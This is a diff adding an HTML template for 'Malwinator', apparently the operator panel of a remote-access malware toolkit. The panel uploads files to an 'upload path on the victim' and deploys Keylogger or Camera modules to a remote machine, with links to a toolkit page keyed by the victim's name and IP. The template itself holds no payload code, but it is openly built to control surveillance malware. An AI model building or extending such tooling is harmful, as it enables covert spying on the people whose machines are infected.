@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malwinator</title>
+    <meta charset="US-ASCII">
+    <link rel="stylesheet" href="{{url_for('static', filename='css/styles.css')}}">
+    <script src="{{url_for('static', filename='js/upload.js')}}" defer></script>
+    <script src="{{url_for('static', filename='js/command.js')}}" defer></script>
+    
+</head>
+<body>
+  <div class="container">
+    <h1>{{message}}</h1>
+
+    <p>Note: if you have a module already installed on the remote computer and you just want to add/update the 
+      path to it just put the new path (to the module's file on the machine not just the directory) and select the module without checking a file to be uploaded.</p>
+
+    <form class="form-left" action="/upload_file" method="POST" enctype="multipart/form-data">
+      <label for="file" class="upload-path-label">Choose file to upload to the server:</label>
+      <input type="file" id="file" name="file" class="upload-path-input">
+      <input type="hidden" id="currentUrl" name="currentUrl">
+      <button type="submit" class="btn">Upload File</button>
+    </form>
+
+    <label class="upload-path-label">Files available:</label>
+
+    <fieldset class="file-fieldset">
+      {% for file in files %}
+      <label class="file-label">
+        <input type="radio" id="{{file}}" name="file_input" value="{{file}}" class="file-input">
+        {{file}}
+      </label>
+      {% endfor %}
+    </fieldset>
+    
+    <label class="upload-path-label">Upload path on the victim:</label>
+    <input type="text" id="path" name="path_input" class="upload-path-input">
+    
+    <label class="upload-path-label">Module:</label>
+    <select id="module" class="module-select">
+      <option value="Keylogger">Keylogger</option>
+      <option value="Camera">Camera</option>
+      <option value="None" selected>None</option>
+    </select>
+    
+    <h3 id="uploadResult" class="upload-result"></h3>
+    <p id="command-result" class="command-result"></p>
+    <a class="btn btn-upload" onclick="uploadFile()">Upload File</a>
+    <a class="btn btn-go-back" href="/toolkit?name={{name}}&ip={{ip}}">Go back</a>
+  </div>
+  <script>
+    ip = "{{ip}}"
+    name = "{{name}}"
+    document.getElementById('currentUrl').value = window.location.href;
+  </script>
+</body>
+</html>
